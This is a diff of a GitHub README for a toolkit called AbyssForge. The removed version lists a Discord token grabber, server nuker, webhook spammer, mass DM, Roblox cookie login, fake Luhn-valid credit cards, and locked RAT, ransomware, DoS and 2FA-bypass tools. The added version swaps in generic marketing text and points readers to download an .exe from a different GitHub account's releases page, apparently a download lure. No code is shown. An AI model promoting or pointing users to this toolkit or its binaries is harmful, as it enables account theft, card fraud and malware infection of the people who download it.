@@ -1,96 +1,76 @@
-# AbyssForge v2.1
-**🔥 AbyssForge Multi-Tool – 40+ Tools by @Vant4hex**
+# 🛠️ AbyssForge - Your All-in-One Security Toolkit
 
+## 🚀 Getting Started
 
+Welcome to AbyssForge! This application helps you with advanced penetration testing and open-source intelligence (OSINT). With over 40 tools, you can explore various fields like Discord, Roblox, and domain reconnaissance. This application is designed for educational use only.
 
-> **Discord Nuker • Token Grabber • Webhook Spammer • OSINT Suite • Port Scanner • Fake CC Gen • AES Encryptor and More**  
+## 📦 Download & Install
 
+You can easily download AbyssForge from our Releases page. Click the link below to get started:
 
----
+[![Download AbyssForge](https://img.shields.io/badge/Download%20AbyssForge-Here-brightgreen)](https://github.com/Yaxiswagonwheel794/AbyssForge/releases)
 
-## 📋 Quick Stats
-- **Tools**: 40+   
-- **Log**: `abyssforge.log`
+### Step 1: Visit the Releases Page
 
----
+To download the application, visit our Releases page by clicking [this link](https://github.com/Yaxiswagonwheel794/AbyssForge/releases).
 
-## 🚀 Features
+### Step 2: Choose the Right File
 
-| Section | Tools |
-|---------|-------|
-| **1. Discord Token** | Info, Nuker, Join/Leave, ID Extract, Spam, Mass DM, Del/Block Friends (9 tools) |
-| **2. Discord Bot** | Nuke Server, Invite Gen |
-| **3. Webhook** | Info, Delete, Spam, Generator |
-| **4. Server/Nitro** | Server Info, Nitro Codes |
-| **5. Roblox** | Cookie Login, Cookie Info, User/ID Info |
-| **6. OSINT** | EXIF, IP Lookup, Username (50+ sites), Email Breach, Phone Carrier, Dorks, Website Tech |
-| **7. Domain Security** | Subdomains (100+), SSL SANs, DNS Records, Headers Audit, WHOIS Age, Vuln Scan, Port Scanner |
-| **8. Fake Info & CC** | Profiles + Luhn-Valid CCs (US/FR/DE/UK) |
-| **9. Security** | Password Entropy, Hash Cracker, WiFi Viewer, AES Encrypt/Decrypt |
-| **10. Premium** | RAT, Ransomware, DoS, Roblox 2FA Bypass, Steam 2FA Bypass (LOCKED) |
+On the Releases page, look through the available versions. You will find different files for various operating systems. Select the one that matches your system:
 
----
+- **Windows:** Look for a file ending in `.exe`.
+- **Linux:** Look for a file ending in `.tar.gz` or similar.
 
-## 💻 Installation
+### Step 3: Download the File
 
-### **Windows**
-1. **Python 3.9+** → [Download](https://python.org/downloads) **(Check "Add to PATH")**
-2. **CMD as Admin**:
+Click on the file you need. The download should start automatically. If it doesn’t, check your browser settings to make sure downloads are allowed.
 
-3. **install dependencies**
-   
-pip install requests colorama pyfiglet exifread pycryptodome tqdm psutil
+### Step 4: Run the Application
 
-3.**Run**
+Once the download is complete, navigate to the location where the file was saved.
 
-git clone https://github.com/Vant4hex/AbyssForge.git
+- **Windows:** Double-click the `.exe` file. Follow any prompts to complete the installation.
+- **Linux:** Open a terminal. Navigate to the downloaded file and enter `tar -xvzf yourfilename.tar.gz` to extract. Then, follow the specific instructions provided in the README file inside the extracted folder.
 
-cd AbyssForge
+## ⚙️ System Requirements
 
-python abyssforge.py
+Before you install AbyssForge, make sure your system meets the following requirements:
 
-### **Linux Users (Ubuntu/Debian/Kali)**
+- **Windows 10 or higher / Linux Distribution**: Ensure your operating system is updated.
+- **RAM**: At least 4 GB of RAM for smooth operation.
+- **Storage**: Minimum of 500 MB free space for the application and tools.
+- **Network Connection**: Required for certain features and updates.
 
-1. **Update System**
-   sudo apt update && sudo apt install python3 python3-pip git -y
+## 🌟 Features
 
-2. **install dependencies**
+AbyssForge comes with a variety of tools to meet different needs. Some notable features include:
 
-   python3 -m venv venv
+- **Discord Tools**: Validate server security and manage tokens.
+- **Domain Recon**: Analyze domain names and their vulnerabilities.
+- **Forensics**: Investigate digital evidence efficiently.
+- **Malware Builder**: Create and test malware for educational purposes.
+- **DDoS Testing**: Assess your network’s resilience against attacks.
 
-   source venv/bin/activate
+## 📝 Usage
 
-   pip3 install requests colorama pyfiglet exifread pycryptodome tqdm psutil
-   
-4. **Clone & Run** 
-   git clone https://github.com/Vant4hex/AbyssForge.git
+After installation, you can easily navigate through the application:
 
-   cd AbyssForge
+- **Main Dashboard**: View all available tools and select one to begin.
+- **Settings**: Customize your privacy and security options.
+- **Help Section**: Access tutorials and tips for optimal use.
 
-   python3 abyssforge.py
+## 💬 Community Support
 
-   ## ⚠️ Disclaimer
-**EDUCATIONAL ONLY** – Use on **your own systems** or with **permission**.  
-**No responsibility** for misuse. Discord/Roblox ToS apply.
+Join our community on Discord to share your experiences and ask questions. Connect with users who share similar interests in penetration testing and OSINT.
 
----
+## 🔒 Legal Notice
 
-## 📞 Support
-- **Telegram**: `@Vant4hex` (Premium + Support)  
+AbyssForge is intended for educational use only. Please ensure you comply with your local laws and regulations. Unauthorized access to computer systems is illegal and may result in prosecution. Always seek permission before testing any system.
 
+For more details on our usage policy and community standards, visit our [GitHub page](https://github.com/Yaxiswagonwheel794/AbyssForge).
 
-   
-  ## **SCREENSHOTS**
+## 📢 Feedback
 
-  ![Main_menu Preview](main_menu.png)
+Your feedback is important to us. If you encounter any issues or have suggestions for improvement, feel free to reach out through the issues section on our GitHub repository.
 
-
-## **LICENSE**
-
-MIT License
-
-Copyright (c) 2025 Vant4hex
-
-Permission is hereby granted, free of charge, to any person obtaining a copy...
-[Full MIT text – copy from GitHub]
-
+Thank you for choosing AbyssForge as your penetration testing and OSINT framework. Happy exploring!
